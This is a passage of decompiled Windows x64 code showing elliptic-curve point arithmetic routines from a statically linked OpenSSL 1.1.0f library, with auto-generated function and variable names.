    v15 = sub_140027C40(v13);
    v21 = sub_140027C40(v13);
    v23 = sub_140027C40(v13);
    v28 = sub_140027C40(v13);
    v29 = sub_140027C40(v13);
    v24 = sub_140027C40(v13);
    v26 = sub_140027C40(v13);
    if ( !v26 )
      goto LABEL_58;
    if ( *(_DWORD *)(a4 + 32) )
    {
      if ( !sub_140026E90((__int64)v21, *(_QWORD *)(a3 + 8)) )
        goto LABEL_58;
      v16 = sub_140026E90((__int64)v23, *(_QWORD *)(a3 + 16)) == 0i64;
    }
    else
    {
      if ( !v25(a1, v15, *(__int64 **)(a4 + 24), v13)
        || !v14(a1, v21, *(__int64 **)(a3 + 8), v15, v13)
        || !v14(a1, v15, v15, *(__int64 **)(a4 + 24), v13) )
      {
        goto LABEL_58;
      }
      v16 = v14(a1, v23, *(__int64 **)(a3 + 16), v15, v13) == 0;
    }
    if ( v16 )
    {
LABEL_58:
      if ( v13 )
        sub_140027B60((__int64)v13);
      goto LABEL_60;
    }
    if ( *(_DWORD *)(a3 + 32) )
    {
      if ( !sub_140026E90((__int64)v28, *(_QWORD *)(a4 + 8)) )
        goto LABEL_58;
      v17 = sub_140026E90((__int64)v29, *(_QWORD *)(a4 + 16)) == 0i64;
    }
    else
    {
      if ( !v25(a1, v15, *(__int64 **)(a3 + 24), v13)
        || !v14(a1, v28, *(__int64 **)(a4 + 8), v15, v13)
        || !v14(a1, v15, v15, *(__int64 **)(a3 + 24), v13) )
      {
        goto LABEL_58;
      }
      v17 = v14(a1, v29, *(__int64 **)(a4 + 16), v15, v13) == 0;
    }
    if ( v17
      || !(unsigned int)sub_140079890((__int64)v24, (__int64)v21, (__int64)v28, (__int64)v22)
      || !(unsigned int)sub_140079890((__int64)v26, (__int64)v23, (__int64)v29, (__int64)v22) )
    {
      goto LABEL_58;
    }
    if ( sub_140027160((__int64)v24) )
    {
      if ( sub_140027160((__int64)v26) )
      {
        sub_140027B60((__int64)v13);
        v5 = sub_1400221E0((__int64)a1, (_QWORD *)a2, (_QWORD *)a3);
LABEL_60:
        sub_140027BE0(v27);
        return (int *)v5;
      }
      sub_140027560(*(_QWORD *)(a2 + 24), 0i64);
      *(_DWORD *)(a2 + 32) = 0;
      v5 = 1;
      goto LABEL_58;
    }
    if ( !(unsigned int)sub_140079530(v21, (__int64)v21, (__int64)v28, v22)
      || !(unsigned int)sub_140079530(v23, (__int64)v23, (__int64)v29, v22) )
    {
      goto LABEL_58;
    }
    if ( *(_DWORD *)(a3 + 32) )
    {
      if ( *(_DWORD *)(a4 + 32) )
      {
        v18 = v24;
        v19 = sub_140026E90(*(_QWORD *)(a2 + 24), (__int64)v24) == 0i64;
        goto LABEL_43;
      }
      v20 = sub_140026E90((__int64)v15, *(_QWORD *)(a4 + 24)) == 0i64;
    }
    else if ( *(_DWORD *)(a4 + 32) )
    {
      v20 = sub_140026E90((__int64)v15, *(_QWORD *)(a3 + 24)) == 0i64;
    }
    else
    {
      v20 = v14(a1, v15, *(__int64 **)(a3 + 24), *(__int64 **)(a4 + 24), v13) == 0;
    }
    if ( v20 )
      goto LABEL_58;
    v18 = v24;
    v19 = v14(a1, *(__int64 **)(a2 + 24), v15, v24, v13) == 0;
LABEL_43:
    if ( !v19 )
    {
      *(_DWORD *)(a2 + 32) = 0;
      if ( v25(a1, v15, v26, v13) )
      {
        if ( v25(a1, v29, v18, v13)
          && v14(a1, v28, v21, v29, v13)
          && (unsigned int)sub_140079890(*(_QWORD *)(a2 + 8), (__int64)v15, (__int64)v28, (__int64)v22)
          && (unsigned int)sub_1400795A0((__int64)v15, *(_QWORD *)(a2 + 8), v22)
          && (unsigned int)sub_140079890((__int64)v15, (__int64)v28, (__int64)v15, (__int64)v22)
          && v14(a1, v15, v15, v26, v13)
          && v14(a1, v18, v29, v18, v13)
          && v14(a1, v21, v23, v18, v13)
          && (unsigned int)sub_140079890((__int64)v15, (__int64)v15, (__int64)v21, (__int64)v22)
          && (!sub_1400270F0((__int64)v15) || (unsigned int)sub_140041A10((__int64)v15, (__int64)v15, (__int64)v22)) )
        {
          if ( (unsigned int)sub_140047230(*(_QWORD *)(a2 + 16), (__int64)v15) )
            v5 = 1;
        }
      }
    }
    goto LABEL_58;
  }
  return result;
}
// 1400B0090: conditional instruction was optimized away because eax.4!=0

//----- (00000001400B02A0) ----------------------------------------------------
__int64 __fastcall sub_1400B02A0(_QWORD *a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v5; // r12d
  __int64 result; // rax
  __int64 *v10; // r14
  __int64 *v11; // rbx
  __int64 *v12; // rbp
  __int64 v13; // r8
  __int64 v14; // rdx
  bool v15; // zf
  unsigned int (__fastcall *v16)(_QWORD *, __int64 *, __int64 *, int *); // [rsp+30h] [rbp-58h]
  unsigned int (__fastcall *v17)(_QWORD *, __int64 *, __int64 *, __int64 *, int *); // [rsp+38h] [rbp-50h]
  __int64 *v18; // [rsp+40h] [rbp-48h]
  __int64 *v19; // [rsp+48h] [rbp-40h]
  __int64 v20; // [rsp+50h] [rbp-38h]

  v5 = 0;
  v20 = 0i64;
  if ( (unsigned int)sub_140022480((__int64)a1, (_QWORD *)a3) )
  {
    sub_140027560(*(_QWORD *)(a2 + 24), 0i64);
    result = 1i64;
    *(_DWORD *)(a2 + 32) = 0;
    return result;
  }
  v10 = (__int64 *)a1[8];
  v16 = *(unsigned int (__fastcall **)(_QWORD *, __int64 *, __int64 *, int *))(*a1 + 272i64);
  v17 = *(unsigned int (__fastcall **)(_QWORD *, __int64 *, __int64 *, __int64 *, int *))(*a1 + 264i64);
  if ( a4 || (result = (__int64)sub_140027CD0(), v20 = result, (a4 = (int *)result) != 0i64) )
  {
    sub_140027D40(a4);
    v11 = sub_140027C40(a4);
    v12 = sub_140027C40(a4);
    v19 = sub_140027C40(a4);
    v18 = sub_140027C40(a4);
    if ( v18 )
    {
      if ( !*(_DWORD *)(a3 + 32) )
      {
        if ( *((_DWORD *)a1 + 28) )
        {
          if ( !v16(a1, v12, *(__int64 **)(a3 + 24), a4)
            || !(unsigned int)sub_140079530(v11, *(_QWORD *)(a3 + 8), (__int64)v12, v10)
            || !(unsigned int)sub_140079890((__int64)v19, *(_QWORD *)(a3 + 8), (__int64)v12, (__int64)v10)
            || !v17(a1, v12, v11, v19, a4)
            || !(unsigned int)sub_1400795A0((__int64)v11, (__int64)v12, v10) )
          {
            goto LABEL_43;
          }
          v13 = (__int64)v12;
          v14 = (__int64)v11;
        }
        else
        {
          if ( !v16(a1, v11, *(__int64 **)(a3 + 8), a4)
            || !(unsigned int)sub_1400795A0((__int64)v12, (__int64)v11, v10)
            || !(unsigned int)sub_140079530(v11, (__int64)v11, (__int64)v12, v10)
            || !v16(a1, v12, *(__int64 **)(a3 + 24), a4)
            || !v16(a1, v12, v12, a4)
            || !v17(a1, v12, v12, (__int64 *)a1[12], a4) )
          {
            goto LABEL_43;
          }
          v13 = (__int64)v11;
          v14 = (__int64)v12;
        }
LABEL_25:
        if ( (unsigned int)sub_140079530(v12, v14, v13, v10) )
        {
          if ( *(_DWORD *)(a3 + 32) )
            v15 = sub_140026E90((__int64)v11, *(_QWORD *)(a3 + 16)) == 0i64;
          else
            v15 = v17(a1, v11, *(__int64 **)(a3 + 16), *(__int64 **)(a3 + 24), a4) == 0;
          if ( !v15 )
          {
            if ( (unsigned int)sub_1400795A0(*(_QWORD *)(a2 + 24), (__int64)v11, v10) )
            {
              *(_DWORD *)(a2 + 32) = 0;
              if ( v16(a1, v18, *(__int64 **)(a3 + 16), a4) )
              {
                if ( v17(a1, v19, *(__int64 **)(a3 + 8), v18, a4)
                  && (unsigned int)sub_140079610(v19, (__int64)v19, 2, v10)
                  && (unsigned int)sub_1400795A0((__int64)v11, (__int64)v19, v10)
                  && v16(a1, *(__int64 **)(a2 + 8), v12, a4)
                  && (unsigned int)sub_140079890(*(_QWORD *)(a2 + 8), *(_QWORD *)(a2 + 8), (__int64)v11, (__int64)v10)
                  && v16(a1, v11, v18, a4)
                  && (unsigned int)sub_140079610(v18, (__int64)v11, 3, v10)
                  && (unsigned int)sub_140079890((__int64)v11, (__int64)v19, *(_QWORD *)(a2 + 8), (__int64)v10)
                  && v17(a1, v11, v12, v11, a4) )
                {
                  if ( (unsigned int)sub_140079890(*(_QWORD *)(a2 + 16), (__int64)v11, (__int64)v18, (__int64)v10) )
                    v5 = 1;
                }
              }
            }
          }
        }
        goto LABEL_43;
      }
      if ( v16(a1, v11, *(__int64 **)(a3 + 8), a4)
        && (unsigned int)sub_1400795A0((__int64)v12, (__int64)v11, v10)
        && (unsigned int)sub_140079530(v11, (__int64)v11, (__int64)v12, v10) )
      {
        v13 = a1[12];
        v14 = (__int64)v11;
        goto LABEL_25;
      }
    }
LABEL_43:
    sub_140027B60((__int64)a4);
    sub_140027BE0(v20);
    return v5;
  }
  return result;
}

//----- (00000001400B06E0) ----------------------------------------------------
__int64 __fastcall sub_1400B06E0(__int64 a1, _QWORD *a2)
{
  if ( (unsigned int)sub_140022480(a1, a2) || sub_140027160(a2[2]) )
    return 1i64;
  else
    return sub_140041C70(a2[2], *(_QWORD *)(a1 + 64), a2[2]);
}

//----- (00000001400B0740) ----------------------------------------------------
__int64 __fastcall sub_1400B0740(__int64 a1, __int64 a2, int *a3)
{
  unsigned int v6; // r12d
  __int64 *v8; // r15
  unsigned int (__fastcall *v9)(__int64, __int64 *, __int64 *, __int64 *, int *); // r13
  __int64 *v10; // rsi
  __int64 *v11; // rbp
  int v12; // eax
  __int64 v13; // r8
  unsigned int (__fastcall *v14)(__int64, __int64 *, __int64 *, int *); // [rsp+30h] [rbp-48h]
  __int64 *v15; // [rsp+38h] [rbp-40h]
  int *v16; // [rsp+40h] [rbp-38h]
  __int64 *v17; // [rsp+98h] [rbp+20h]

  v16 = 0i64;
  v6 = -1;
  if ( (unsigned int)sub_140022480(a1, (_QWORD *)a2) )
    return 1i64;
  v8 = *(__int64 **)(a1 + 64);
  v9 = *(unsigned int (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, int *))(*(_QWORD *)a1 + 264i64);
  v14 = *(unsigned int (__fastcall **)(__int64, __int64 *, __int64 *, int *))(*(_QWORD *)a1 + 272i64);
  if ( a3 || (v16 = (int *)sub_140027CD0(), (a3 = v16) != 0i64) )
  {
    sub_140027D40(a3);
    v10 = sub_140027C40(a3);
    v11 = sub_140027C40(a3);
    v17 = sub_140027C40(a3);
    v15 = sub_140027C40(a3);
    if ( !v15 || !v14(a1, v10, *(__int64 **)(a2 + 8), a3) )
      goto LABEL_27;
    if ( *(_DWORD *)(a2 + 32) )
    {
      if ( (unsigned int)sub_140079530(v10, (__int64)v10, *(_QWORD *)(a1 + 96), v8)
        && v9(a1, v10, v10, *(__int64 **)(a2 + 8), a3) )
      {
        v13 = *(_QWORD *)(a1 + 104);
LABEL_24:
        if ( (unsigned int)sub_140079530(v10, (__int64)v10, v13, v8) )
        {
          if ( v14(a1, v11, *(__int64 **)(a2 + 16), a3) )
            v6 = sub_140027600(v11, v10) == 0;
        }
      }
    }
    else
    {
      if ( !v14(a1, v11, *(__int64 **)(a2 + 24), a3) || !v14(a1, v17, v11, a3) || !v9(a1, v15, v17, v11, a3) )
        goto LABEL_27;
      if ( *(_DWORD *)(a1 + 112) )
      {
        if ( !(unsigned int)sub_1400795A0((__int64)v11, (__int64)v17, v8)
          || !(unsigned int)sub_140079530(v11, (__int64)v11, (__int64)v17, v8) )
        {
          goto LABEL_27;
        }
        v12 = sub_140079890((__int64)v10, (__int64)v10, (__int64)v11, (__int64)v8);
      }
      else
      {
        if ( !v9(a1, v11, v17, *(__int64 **)(a1 + 96), a3) )
          goto LABEL_27;
        v12 = sub_140079530(v10, (__int64)v10, (__int64)v11, v8);
      }
      if ( v12 && v9(a1, v10, v10, *(__int64 **)(a2 + 8), a3) && v9(a1, v11, *(__int64 **)(a1 + 104), v15, a3) )
      {
        v13 = (__int64)v11;
        goto LABEL_24;
      }
    }
LABEL_27:
    sub_140027B60((__int64)a3);
    sub_140027BE0((__int64)v16);
  }
  return v6;
}

//----- (00000001400B0A10) ----------------------------------------------------
__int64 __fastcall sub_1400B0A10(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v4; // r15d
  unsigned int v9; // ebx
  unsigned int (__fastcall *v11)(__int64, __int64 *, _QWORD *, _QWORD *, int *); // r12
  _QWORD *v12; // rax
  _QWORD *v13; // r13
  _QWORD *v14; // r9
  __int64 v15; // r13
  __int64 *v16; // r12
  __int64 *v17; // [rsp+30h] [rbp-68h]
  unsigned int (__fastcall *v18)(__int64, __int64 *, _QWORD *, _QWORD *, int *); // [rsp+38h] [rbp-60h]
  __int64 *v19; // [rsp+40h] [rbp-58h]
  unsigned int (__fastcall *v20)(__int64, _QWORD *, _QWORD, int *); // [rsp+48h] [rbp-50h]
  __int64 *v21; // [rsp+50h] [rbp-48h]
  __int64 *v22; // [rsp+58h] [rbp-40h]
  int *v23; // [rsp+60h] [rbp-38h]

  v4 = 0;
  v23 = 0i64;
  v9 = -1;
  if ( (unsigned int)sub_140022480(a1, (_QWORD *)a2) )
  {
    LOBYTE(v4) = (unsigned int)sub_140022480(a1, (_QWORD *)a3) == 0;
    return v4;
  }
  if ( (unsigned int)sub_140022480(a1, (_QWORD *)a3) )
    return 1i64;
  if ( !*(_DWORD *)(a2 + 32) || !*(_DWORD *)(a3 + 32) )
  {
    v11 = *(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 264i64);
    v20 = *(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD, int *))(*(_QWORD *)a1 + 272i64);
    v18 = v11;
    if ( !a4 )
    {
      v23 = (int *)sub_140027CD0();
      a4 = v23;
      if ( !v23 )
        return v9;
    }
    sub_140027D40(a4);
    v22 = sub_140027C40(a4);
    v19 = sub_140027C40(a4);
    v17 = sub_140027C40(a4);
    v12 = sub_140027C40(a4);
    v21 = v12;
    v13 = v12;
    if ( v12 )
    {
      if ( *(_DWORD *)(a3 + 32) )
      {
        v15 = *(_QWORD *)(a2 + 8);
      }
      else
      {
        if ( !v20(a1, v12, *(_QWORD *)(a3 + 24), a4) )
          goto LABEL_37;
        v14 = v13;
        v15 = (__int64)v22;
        if ( !v11(a1, v22, *(_QWORD **)(a2 + 8), v14, a4) )
          goto LABEL_37;
      }
      if ( *(_DWORD *)(a2 + 32) )
      {
        v16 = *(__int64 **)(a3 + 8);
      }
      else
      {
        if ( !v20(a1, v17, *(_QWORD *)(a2 + 24), a4) || !v11(a1, v19, *(_QWORD **)(a3 + 8), v17, a4) )
          goto LABEL_37;
        v16 = v19;
      }
      if ( (unsigned int)sub_140026AB0(v15, v16) )
      {
        v9 = 1;
      }
      else
      {
        if ( *(_DWORD *)(a3 + 32) )
        {
          v15 = *(_QWORD *)(a2 + 16);
        }
        else if ( !v18(a1, v21, v21, *(_QWORD **)(a3 + 24), a4) || !v18(a1, v22, *(_QWORD **)(a2 + 16), v21, a4) )
        {
          goto LABEL_37;
        }
        if ( *(_DWORD *)(a2 + 32) )
        {
          v16 = *(__int64 **)(a3 + 16);
        }
        else if ( !v18(a1, v17, v17, *(_QWORD **)(a2 + 24), a4) || !v18(a1, v19, *(_QWORD **)(a3 + 16), v17, a4) )
        {
          goto LABEL_37;
        }
        v9 = sub_140026AB0(v15, v16) != 0;
      }
    }
LABEL_37:
    sub_140027B60((__int64)a4);
    sub_140027BE0((__int64)v23);
    return v9;
  }
  if ( (unsigned int)sub_140026AB0(*(_QWORD *)(a2 + 8), *(__int64 **)(a3 + 8))
    || (unsigned int)sub_140026AB0(*(_QWORD *)(a2 + 16), *(__int64 **)(a3 + 16)) )
  {
    return 1;
  }
  return v4;
}
// 1400B0A10: too many cbuild loops

//----- (00000001400B0CD0) ----------------------------------------------------
__int64 __fastcall sub_1400B0CD0(__int64 a1, __int64 a2, int *a3)
{
  __int64 v3; // rsi
  unsigned int v7; // edi
  __int64 result; // rax

  v3 = 0i64;
  v7 = 0;
  if ( *(_DWORD *)(a2 + 32) || (unsigned int)sub_140022480(a1, (_QWORD *)a2) )
    return 1i64;
  if ( a3 || (result = (__int64)sub_140027CD0(), v3 = result, (a3 = (int *)result) != 0i64) )
  {
    sub_140027D40(a3);
    sub_140027C40(a3);
    if ( sub_140027C40(a3)
      && (unsigned int)sub_140022380(a1, (_QWORD *)a2)
      && (unsigned int)sub_1400228F0(a1, (_QWORD *)a2) )
    {
      if ( *(_DWORD *)(a2 + 32) )
        v7 = 1;
      else
        sub_140024610(16, 102, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 1188);
    }
    sub_140027B60((__int64)a3);
    sub_140027BE0(v3);
    return v7;
  }
  return result;
}

//----- (00000001400B0DF0) ----------------------------------------------------
__int64 __fastcall sub_1400B0DF0(__int64 **a1, unsigned __int64 a2, __int64 a3, int *a4)
{
  unsigned __int64 v4; // rbp
  int *v5; // rsi
  unsigned int v8; // r14d
  __int64 result; // rax
  _QWORD *v10; // r12
  _QWORD *v11; // rax
  __int64 *v12; // r13
  __int64 v13; // rdi
  _DWORD *v14; // rax
  __int64 v15; // rdi
  bool v16; // zf
  __int64 (__fastcall *v17)(__int64 **, __int64, int *); // r9
  int v18; // eax
  unsigned __int64 v19; // r14
  __int64 v20; // rdi
  char *v21; // r13
  __int64 *v23; // rax
  __int64 *v24; // rcx
  unsigned int (__fastcall *v25)(__int64 **, _QWORD *, _QWORD *, int *); // r10
  unsigned __int64 v26; // r14
  char *v27; // r13
  __int64 v28; // rdi
  __int64 v29; // rdi
  unsigned __int64 i; // r14
  __int64 v31; // rdi
  __int64 (__fastcall *v32)(__int64 **, _QWORD, int *); // r9
  __int64 *v34; // [rsp+30h] [rbp-58h]
  __int64 v35; // [rsp+38h] [rbp-50h]
  __int64 v36; // [rsp+40h] [rbp-48h]

  v4 = 0i64;
  v5 = a4;
  v36 = 0i64;
  v34 = 0i64;
  v8 = 0;
  if ( !a2 )
    return 1i64;
  if ( a4 || (result = (__int64)sub_140027CD0(), v36 = result, (v5 = (int *)result) != 0i64) )
  {
    sub_140027D40(v5);
    v10 = sub_140027C40(v5);
    v11 = sub_140027C40(v5);
    v35 = (__int64)v11;
    if ( v10 )
    {
      if ( v11 )
      {
        v34 = (__int64 *)sub_14001D8E0(8 * a2);
        v12 = v34;
        if ( v34 )
        {
          v13 = 0i64;
          if ( a2 )
          {
            do
            {
              v14 = sub_140027200();
              v34[v13] = (__int64)v14;
              if ( !v14 )
                goto LABEL_29;
            }
            while ( ++v13 < a2 );
          }
          v15 = a3;
          if ( sub_140027160(*(_QWORD *)(*(_QWORD *)a3 + 24i64)) )
          {
            v17 = (__int64 (__fastcall *)(__int64 **, __int64, int *))(*a1)[38];
            v18 = v17 ? v17(a1, *v34, v5) : sub_140027560(*v34, 1i64);
            v16 = v18 == 0;
          }
          else
          {
            v16 = sub_140026E90(*v34, *(_QWORD *)(*(_QWORD *)a3 + 24i64)) == 0i64;
          }
          if ( !v16 )
          {
            v19 = 1i64;
            if ( a2 <= 1 )
            {
LABEL_26:
              if ( sub_14006FDD0(v10, v12[a2 - 1], a1[8], v5) )
              {
                v25 = (unsigned int (__fastcall *)(__int64 **, _QWORD *, _QWORD *, int *))(*a1)[36];
                if ( !v25
                  || v25(a1, v10, v10, v5)
                  && ((unsigned int (__fastcall *)(__int64 **, _QWORD *, _QWORD *, int *))(*a1)[36])(a1, v10, v10, v5) )
                {
                  v26 = a2 - 1;
                  if ( a2 == 1 )
                  {
LABEL_46:
                    v29 = a3;
                    if ( sub_140027160(*(_QWORD *)(*(_QWORD *)a3 + 24i64))
                      || sub_140026E90(*(_QWORD *)(*(_QWORD *)a3 + 24i64), (__int64)v10) )
                    {
                      for ( i = 0i64; i < a2; ++i )
                      {
                        v31 = *(_QWORD *)(v29 + 8 * i);
                        if ( !sub_140027160(*(_QWORD *)(v31 + 24)) )
                        {
                          if ( !((unsigned int (__fastcall *)(__int64 **, _QWORD *, _QWORD, int *))(*a1)[34])(
                                  a1,
                                  v10,
                                  *(_QWORD *)(v31 + 24),
                                  v5)
                            || !((unsigned int (__fastcall *)(__int64 **, _QWORD, _QWORD, _QWORD *, int *))(*a1)[33])(
                                  a1,
                                  *(_QWORD *)(v31 + 8),
                                  *(_QWORD *)(v31 + 8),
                                  v10,
                                  v5)
                            || !((unsigned int (__fastcall *)(__int64 **, _QWORD *, _QWORD *, _QWORD, int *))(*a1)[33])(
                                  a1,
                                  v10,
                                  v10,
                                  *(_QWORD *)(v31 + 24),
                                  v5)
                            || !((unsigned int (__fastcall *)(__int64 **, _QWORD, _QWORD, _QWORD *, int *))(*a1)[33])(
                                  a1,
                                  *(_QWORD *)(v31 + 16),
                                  *(_QWORD *)(v31 + 16),
                                  v10,
                                  v5) )
                          {
                            goto LABEL_28;
                          }
                          v32 = (__int64 (__fastcall *)(__int64 **, _QWORD, int *))(*a1)[38];
                          if ( !(v32
                               ? v32(a1, *(_QWORD *)(v31 + 24), v5)
                               : (unsigned int)sub_140027560(*(_QWORD *)(v31 + 24), 1i64)) )
                            goto LABEL_28;
                          *(_DWORD *)(v31 + 32) = 1;
                        }
                        v29 = a3;
                      }
                      v8 = 1;
                      goto LABEL_29;
                    }
                  }
                  else
                  {
                    v27 = (char *)v12 - a3;
                    v28 = v15 + 8 * v26;
                    while ( sub_140027160(*(_QWORD *)(*(_QWORD *)v28 + 24i64))
                         || ((unsigned int (__fastcall *)(__int64 **, __int64, _QWORD, _QWORD *, int *))(*a1)[33])(
                              a1,
                              v35,
                              *(_QWORD *)&v27[v28 - 8],
                              v10,
                              v5)
                         && ((unsigned int (__fastcall *)(__int64 **, _QWORD *, _QWORD *, _QWORD, int *))(*a1)[33])(
                              a1,
                              v10,
                              v10,
                              *(_QWORD *)(*(_QWORD *)v28 + 24i64),
                              v5)
                         && sub_140026E90(*(_QWORD *)(*(_QWORD *)v28 + 24i64), v35) )
                    {
                      v28 -= 8i64;
                      if ( !--v26 )
                        goto LABEL_46;
                    }
                  }
                }
              }
              else
              {
                sub_140024610(16, 137, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_smpl.c", 1269);
              }
            }
            else
            {
              v20 = a3 + 8;
              v21 = (char *)v34 - a3;
              while ( !(sub_140027160(*(_QWORD *)(*(_QWORD *)v20 + 24i64))
                      ? sub_140026E90(*(_QWORD *)&v21[v20], *(_QWORD *)&v21[v20 - 8]) == 0i64
                      : ((unsigned int (__fastcall *)(__int64 **, _QWORD, _QWORD, _QWORD, int *))(*a1)[33])(
                          a1,
                          *(_QWORD *)&v21[v20],
                          *(_QWORD *)&v21[v20 - 8],
                          *(_QWORD *)(*(_QWORD *)v20 + 24i64),
                          v5) == 0) )
              {
                ++v19;
                v20 += 8i64;
                if ( v19 >= a2 )
                {
                  v12 = v34;
                  v15 = a3;
                  goto LABEL_26;
                }
              }
            }
LABEL_28:
            v8 = 0;
          }
        }
      }
    }
LABEL_29:
    sub_140027B60((__int64)v5);
    sub_140027BE0(v36);
    v23 = v34;
    if ( v34 )
    {
      if ( a2 )
      {
        do
        {
          v24 = (__int64 *)v23[v4];
          if ( !v24 )
            break;
          sub_140026A10(v24);
          v23 = v34;
          ++v4;
        }
        while ( v4 < a2 );
      }
      sub_14001D930(v23);
    }
    return v8;
  }
  return result;
}

//----- (00000001400B1290) ----------------------------------------------------
__int64 __fastcall sub_1400B1290(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  return sub_140079710(a2, a3, a4, *(_QWORD *)(a1 + 64), a5);
}

//----- (00000001400B12C0) ----------------------------------------------------
__int64 __fastcall sub_1400B12C0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  return sub_1400797D0(a2, a3, *(_QWORD *)(a1 + 64), a4);
}

//----- (00000001400B12F0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400B12F0(__int64 a1)
{
  return sub_14003CD00(a1);
}

//----- (00000001400B1310) ----------------------------------------------------
__int64 __fastcall sub_1400B1310(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  _QWORD *v9; // rbp
  _QWORD *v10; // rsi
  _DWORD *v11; // r13
  __int64 v12; // rbx
  int v13; // r14d
  unsigned __int64 v14; // rbx
  __int64 v15; // rcx
  unsigned __int64 v16; // rbx
  int v17; // eax
  __int64 v18; // rdi
  __int64 v19; // rax
  __int64 v20; // rdi
  int v21; // eax
  int v22; // [rsp+40h] [rbp-58h]
  __int64 v23; // [rsp+40h] [rbp-58h]
  unsigned int v24; // [rsp+48h] [rbp-50h]
  _DWORD *v25; // [rsp+50h] [rbp-48h]
  __int64 v26; // [rsp+58h] [rbp-40h]

  v24 = 0;
  if ( a2 == a4 )
  {
    sub_140024610(16, 208, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_mult.c", 230);
    return 0i64;
  }
  if ( a3 && !sub_140027160(a3) && a4 && !(unsigned int)sub_140022480((__int64)a1, (_QWORD *)a4) )
  {
    if ( !*(_DWORD *)(a4 + 32) )
      return 0i64;
    sub_140027D40(a5);
    v9 = sub_140027C40(a5);
    v10 = sub_140027C40(a5);
    if ( !v10 )
      goto LABEL_36;
    v11 = *(_DWORD **)(a2 + 8);
    v12 = *(_QWORD *)(a2 + 16);
    v25 = (_DWORD *)v12;
    v13 = sub_140024EB0(a1[8]);
    if ( !sub_140027B30((__int64)v9, v13)
      || !sub_140027B30((__int64)v10, v13)
      || !sub_140027B30((__int64)v11, v13)
      || !sub_140027B30(v12, v13)
      || !(unsigned int)sub_14007A500((__int64)v9, *(_QWORD *)(a4 + 8), (_DWORD *)a1 + 18)
      || !(unsigned int)sub_140027560((__int64)v10, 1i64)
      || !(*(unsigned int (__fastcall **)(_QWORD *, __int64, _QWORD *, int *))(*a1 + 272i64))(a1, v12, v9, a5)
      || !(*(unsigned int (__fastcall **)(_QWORD *, _DWORD *, __int64, int *))(*a1 + 272i64))(a1, v11, v12, a5)
      || !(unsigned int)sub_14007A380((__int64)v11, (__int64)v11, a1[13]) )
    {
      goto LABEL_36;
    }
    v22 = sub_140024EB0(a3) - 1;
    v14 = 0x8000000000000000ui64;
    v15 = *(_QWORD *)(sub_140021BD0(a3) + 8i64 * v22);
    if ( v15 >= 0 )
    {
      do
        v14 >>= 1;
      while ( (v15 & v14) == 0 );
    }
    v16 = v14 >> 1;
    v17 = v22;
    if ( !v16 )
    {
      v17 = v22 - 1;
      v16 = 0x8000000000000000ui64;
    }
    v18 = v17;
    v23 = v17;
    if ( v17 >= 0 )
    {
LABEL_24:
      v19 = *(_QWORD *)(sub_140021BD0(a3) + 8 * v18);
      v26 = v19;
      while ( 1 )
      {
        v20 = v16 & v19;
        sub_140026B40(v16 & v19, v9, v11, v13);
        sub_140026B40(v20, v10, v25, v13);
        if ( !sub_1400B19A0((__int64)a1, *(_QWORD *)(a4 + 8), (__int64)v11, (__int64)v25, (__int64)v9, (__int64)v10, a5)
          || !sub_1400B1B10(a1, (__int64)v9, (__int64)v10, a5) )
        {
          goto LABEL_36;
        }
        sub_140026B40(v20, v9, v11, v13);
        sub_140026B40(v20, v10, v25, v13);
        v16 >>= 1;
        v19 = v26;
        if ( !v16 )
        {
          v18 = v23 - 1;
          v16 = 0x8000000000000000ui64;
          v23 = v18;
          if ( v18 >= 0 )
            goto LABEL_24;
          break;
        }
      }
    }
    v21 = sub_1400B1C50(
            (__int64)a1,
            *(_QWORD *)(a4 + 8),
            *(_QWORD *)(a4 + 16),
            (__int64)v9,
            (__int64)v10,
            (__int64)v11,
            (__int64)v25,
            a5);
    if ( v21 )
    {
      if ( v21 == 1 )
      {
        if ( (unsigned int)sub_1400229F0((__int64)a1, (_QWORD *)a2) )
          goto LABEL_35;
      }
      else if ( (unsigned int)sub_140027560(*(_QWORD *)(a2 + 24), 1i64) )
      {
        *(_DWORD *)(a2 + 32) = 1;
LABEL_35:
        sub_140027540(*(_QWORD *)(a2 + 8), 0);
        sub_140027540(*(_QWORD *)(a2 + 16), 0);
        v24 = 1;
      }
    }
LABEL_36:
    sub_140027B60((__int64)a5);
    return v24;
  }
  return sub_1400229F0((__int64)a1, (_QWORD *)a2);
}
// 1400B1569: conditional instruction was optimized away because rbx.8!=0

//----- (00000001400B1710) ----------------------------------------------------
__int64 *__fastcall sub_1400B1710(__int64 a1, int *a2)
{
  return sub_14003DA00(a1, a2);
}

//----- (00000001400B1730) ----------------------------------------------------
int *__fastcall sub_1400B1730(
        __int64 *a1,
        _QWORD *a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        __int64 *a6,
        int *a7)
{
  int *v7; // r14
  unsigned int v8; // r13d
  _QWORD *v13; // rbp
  _QWORD *v14; // r15
  int *result; // rax
  _QWORD *v16; // rax
  unsigned __int64 v17; // rsi
  __int64 *v18; // rbx
  __int64 v19; // rax
  __int64 v20; // [rsp+40h] [rbp-38h]

  v7 = a7;
  v8 = 0;
  v20 = 0i64;
  v13 = 0i64;
  v14 = 0i64;
  if ( a7 || (result = (int *)sub_140027CD0(), v20 = (__int64)result, (v7 = result) != 0i64) )
  {
    if ( a3 && a4 > 1 || a4 > 2 || !a4 && (unsigned int)sub_140021B90((__int64)a1) )
    {
      v8 = sub_14003CD20((__FrameHandler3::TryBlockMap *)a1, a2, a3, a4, a5, a6, (__int64)v7);
    }
    else
    {
      v13 = sub_140022670(a1);
      if ( v13 )
      {
        v16 = sub_140022670(a1);
        v14 = v16;
        if ( v16 )
        {
          if ( (unsigned int)sub_1400229F0((__int64)a1, v16) )
          {
            if ( !a3
              || (unsigned int)sub_1400B1310(a1, (__int64)v13, a3, a1[1], v7)
              && (!sub_1400270E0(a3)
